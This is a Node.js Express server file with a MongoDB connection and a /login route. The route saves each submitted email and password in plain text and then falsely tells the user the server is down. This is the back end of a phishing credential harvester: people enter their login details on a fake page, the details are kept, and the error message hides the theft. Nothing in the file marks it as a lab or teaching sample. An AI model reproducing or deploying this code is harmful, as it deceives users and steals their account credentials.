require("dotenv").config();

const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

const User = require("./models/User");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

mongoose.connect(process.env.MONGO_URI)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log(err));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/login", async (req, res) => {

    const { email, password } = req.body;

    const user = new User({
        email,
        password
    });

    await user.save();
    res.send("<h2>Server is down please try later!</h2>");
});

app.listen(3000, () => {
    console.log("Server running on http://localhost:3000");
});